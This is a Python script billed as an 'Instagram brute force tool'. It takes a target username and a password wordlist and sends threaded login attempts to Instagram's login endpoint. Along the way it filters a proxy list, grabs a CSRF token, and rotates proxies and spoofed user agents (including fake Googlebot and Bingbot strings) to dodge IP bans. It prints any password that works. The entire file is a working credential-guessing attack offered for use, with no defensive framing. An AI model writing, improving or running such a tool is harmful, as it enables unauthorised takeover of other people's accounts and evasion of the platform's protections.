# coding=utf-8
##################################################################
# Instagram brute force tool
# Author:Oloo Daudi
# Instagram account:https://www.instagram.com/olpas9/
# GitHub: Olpas9
# !/usr/bin/python
###################################################################
from __future__ import print_function

import argparse
import logging
import random
import socket
import sys
import threading

try:
    import urllib.request as rq
    from urllib.error import HTTPError
    import urllib.parse as http_parser
except ImportError:
    import urllib2 as rq
    from urllib2 import HTTPError
    import urllib as http_parser

try:
    import Queue
except ImportError:
    import queue as Queue


class bcolors:
    HEADER = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def check_proxy(q):
    """
    check proxy for and append to working proxies
    :param q:
    """
    if not q.empty():

        proxy = q.get(False)
        proxy = proxy.replace("\r", "").replace("\n", "")

        try:
            opener = rq.build_opener(
                rq.ProxyHandler({'https': 'https://' + proxy}),
                rq.HTTPHandler(),
                rq.HTTPSHandler()
            )

            opener.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11')]
            rq.install_opener(opener)

            req = rq.Request('https://api64.ipify.org/')

            if rq.urlopen(req).read().decode() == proxy.partition(':')[0]:
                proxys_working_list.update({proxy: proxy})
                if _verbose:
                    print(bcolors.OKGREEN + " --[+] ", proxy, " | PASS" + bcolors.ENDC)
            else:
                if _verbose:
                    print(" --[!] ", proxy, " | FAILED")

        except Exception as err:
            if _verbose:
                print(" --[!] ", proxy, " | FAILED")
            if _debug:
                logger.error(err)
            pass


def get_csrf():
    """
    get CSRF token from login page to use in POST requests
    """
    global csrf_token

    print(bcolors.WARNING + "[+] Getting CSRF Token: " + bcolors.ENDC)

    try:
        opener = rq.build_opener(rq.HTTPHandler(), rq.HTTPSHandler())
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        rq.install_opener(opener)

        request = rq.Request('https://www.instagram.com/')
        try:
            # python 2
            headers = rq.urlopen(request).info().headers
        except Exception:
            # python 3
            headers = rq.urlopen(request).info().get_all('Set-Cookie')

        for header in headers:
            if header.find('csrftoken') != -1:
                csrf_token = header.partition(';')[0].partition('=')[2]
                print(bcolors.OKGREEN + "[+] CSRF Token :", csrf_token, "\n" + bcolors.ENDC)
    except Exception as err:
        print(bcolors.FAIL + "[!] Can't get CSRF token , please use -d for debug" + bcolors.ENDC)

        if _debug:
            logger.error(err)

        print(bcolors.FAIL + "[!] Exiting..." + bcolors.ENDC)
        exit(3)


def brute(q):
    """
    main worker function
    :param word:
    :param event:
    :return:
    """
    if not q.empty():
        try:
            proxy = None
            if len(proxys_working_list) != 0:
                proxy = random.choice(list(proxys_working_list.keys()))

            word = q.get()
            word = word.replace("\r", "").replace("\n", "")

            post_data = {
                'username': USER,
                'password': word,
            }

            header = {
                "User-Agent": random.choice(user_agents),
                'X-Instagram-AJAX': 'c2d8f4380025 ',
                "X-CSRFToken" :'7dmO9F3JuVGvSXumd79yByPxnHoWHz1A ',
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                'Cookie': 'csrftoken=' + csrf_token
            }

            if proxy:
                if _verbose:
                    print(bcolors.BOLD + "[*] Trying %s %s " % (word, " | " + proxy,) + bcolors.ENDC)

                opener = rq.build_opener(
                    rq.ProxyHandler({'https': 'https://' + proxy}),
                    rq.HTTPHandler(),
                    rq.HTTPSHandler()
                )

            else:
                if _verbose:
                    print(bcolors.BOLD + "[*] Trying %s" % (word,) + bcolors.ENDC)

                opener = rq.build_opener(
                    rq.HTTPHandler(),
                    rq.HTTPSHandler()
                )

            rq.install_opener(opener)

            req = rq.Request(URL, data=http_parser.urlencode(post_data).encode('ascii'), headers=header)
            sock = rq.urlopen(req)

            if sock.read().decode().find('"authenticated": true') != -1:
                print(bcolors.OKGREEN + bcolors.BOLD + "\n[*]Successful Login:")
                print("---------------------------------------------------")
                print("[!]Username: ", USER)
                print("[!]Password: ", word)
                print("---------------------------------------------------\n" + bcolors.ENDC)
                found_flag = True
                q.queue.clear()
                q.task_done()

        except HTTPError as e:
            if e.getcode() == 400 or e.getcode() == 403:
                if e.read().decode("utf8", 'ignore').find('"checkpoint_required"') != -1:
                    print(bcolors.OKGREEN + bcolors.BOLD + "\n[*]Successful Login "
                          + bcolors.FAIL + "But need Checkpoint :|" + bcolors.OKGREEN)
                    print("---------------------------------------------------")
                    print("[!]Username: ", USER)
                    print("[!]Password: ", word)
                    print("---------------------------------------------------\n" + bcolors.ENDC)
                    found_flag = True
                    q.queue.clear()
                    q.task_done()
                    return
                elif proxy:
                    print(bcolors.WARNING +
                          "[!]Error: Proxy IP %s is now on Instagram jail ,  Removing from working list !" % (proxy,)
                          + bcolors.ENDC
                          )
                    if proxy in proxys_working_list:
                        proxys_working_list.pop(proxy)
                    print(bcolors.OKGREEN + "[+] Online Proxy: ", str(len(proxys_working_list)) + bcolors.ENDC)
                else:
                    print(bcolors.FAIL + "[!]Error : Your Ip is now on Instagram jail ,"
                          " script will not work fine until you change your ip or use proxy" + bcolors.ENDC)
            else:
                print("Error:", e.getcode())

            q.task_done()
            return

        except Exception as err:
            if _debug:
                print(bcolors.FAIL + "[!] Unknown Error in request." + bcolors.ENDC)
                logger.error(err)
            else:
                print(bcolors.FAIL + "[!] Unknown Error in request, please turn on debug mode with -d" + bcolors.ENDC)

            pass
            return


def starter():
    """
    threading workers initialize
    """
    global found_flag

    queue = Queue.Queue()
    threads = []
    max_thread = THREAD
    found_flag = False

    queuelock = threading.Lock()

    print(bcolors.HEADER + "\n[!] Initializing Workers")
    print("[!] Start Cracking ... \n" + bcolors.ENDC)

    try:
        for word in words:
            queue.put(word)
        while not queue.empty():
            queuelock.acquire()
            for workers in range(max_thread):
                t = threading.Thread(target=brute, args=(queue,))
                t.setDaemon(True)
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
            queuelock.release()
            if found_flag:
                break
        print(bcolors.OKGREEN + "\n--------------------")
        print("[!] Brute complete !" + bcolors.ENDC)

    except Exception as err:
        print(err)


def check_avalaible_proxys(proxys):
    """
        check avalaible proxyies from proxy_list file
    """
    socket.setdefaulttimeout(30)

    global proxys_working_list
    print(bcolors.WARNING + "[-] Testing Proxy List...\n" + bcolors.ENDC)

    proxys_working_list = {}
    max_thread = THREAD

    queue = Queue.Queue()
    queuelock = threading.Lock()
    threads = []

    for proxy in proxys:
        queue.put(proxy)

    while not queue.empty():
        queuelock.acquire()
        for workers in range(max_thread):
            t = threading.Thread(target=check_proxy, args=(queue,))
            t.setDaemon(True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        queuelock.release()

    print(bcolors.OKGREEN + "[+] Online Proxy: " + bcolors.BOLD + str(len(proxys_working_list)) + bcolors.ENDC + "\n")


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        description="Instagram BruteForcer",
        epilog="./Instaolo-brute -u user_test -w words.txt -p proxys.txt -t 4 -d -v"
    )

    # required argument
    parser.add_argument('-u', '--username', action="store", required=True,
                        help='Target Username')
    parser.add_argument('-w', '--word', action="store", required=True,
                        help='Words list path')
    parser.add_argument('-p', '--proxy', action="store", required=True,
                        help='Proxy list path')
    # optional arguments
    parser.add_argument('-t', '--thread', help='Thread', type=int, default=4)
    parser.add_argument('-v', '--verbose', action='store_const', help='Thread', const=True, default=False)
    parser.add_argument('-d', '--debug', action='store_const', const=True, help='Debug mode', default=False)

    args = parser.parse_args()

    URL = "https://www.instagram.com/accounts/login/ajax/"
    USER = args.username
    THREAD = args.thread
    _verbose = args.verbose
    _debug = args.debug

    user_agents = ['Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)',
                   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko)',
                   'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1',
                   'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)',
                   'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
                   'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                       'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36',
    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview Analytics) Chrome/27.0.1453 Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; adidxbot/2.0;  http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (seoanalyzer; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) SitemapProbe',
    'Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 530) like Gecko (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; adidxbot/2.0;  http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
     'Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))']

    try:
        words = open(args.word).readlines()
    except IOError:
        print("[-] Error: Check your word list file path\n")
        sys.exit(1)

    try:
        proxys = open(args.proxy).readlines()
    except IOError:
        print("[-] Error: Check your proxy list file path\n")
        sys.exit(1)

    # enable debugging if its set
    if _debug:
        # Logging stuff
        logging.basicConfig(level=logging.DEBUG, filename="log",
                            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        logger = logging.getLogger(__name__)

    print(bcolors.OKGREEN + bcolors.BOLD +  """ ___________________________________________________________""")
    print( """| _____          _         _______  __                  |""")
    print( """||_   _|        | |        |  ___ | | |     ____        |""")
    print( """|  | |          | |        | |  | | | |    / __ \       |""")                            
    print( """|  | | _ __  ___| |_ __ _  | |  | | | |   | |  | |      |""")
    print( """|  | || '_ \/ __| __/ _` | | |  | |'| |   | |. | |      |""")
    print( """| _| || | | \__ \ || (_| | | |__| | | |___| \_ /.|      |""")
    print( """| \___/_| |_|___/\__\__,_| \______/ \ ____|\____/.      |""")
    print( """|________________________________________________________________________|""")
  
    print(bcolors.ENDC + bcolors.BOLD + """_____________________________________________""")
    print("""|   AUTHOR:OLOO DAUDI.                                                     |""")
    print("""|.  Instagram: https://www.instagram.com/olpas9/.                          |""")
    print("""|.  "Ahsanteni San na mwisho nawaasa vijana wenzangu                       |""")
    print("""|.   Usikatae tamaa pamban Mungu yupo nawew ".                             |""")
    print("""|.      HACKER FOR LIFE ☠️☠️.                                              |""")                                                 
    print("""|.__________________________________________________________________________""")

    print(bcolors.OKGREEN + "[+] Username Loaded:", bcolors.BOLD + USER + bcolors.ENDC)
    print(bcolors.OKGREEN + "[+] Words Loaded:", bcolors.BOLD + str(len(words)) + bcolors.ENDC)
    print(bcolors.OKGREEN + "[+] Proxy Loaded:", bcolors.BOLD + str(len(proxys)) + bcolors.ENDC)
    print(bcolors.ENDC)

    check_avalaible_proxys(proxys)
    get_csrf()
    starter()
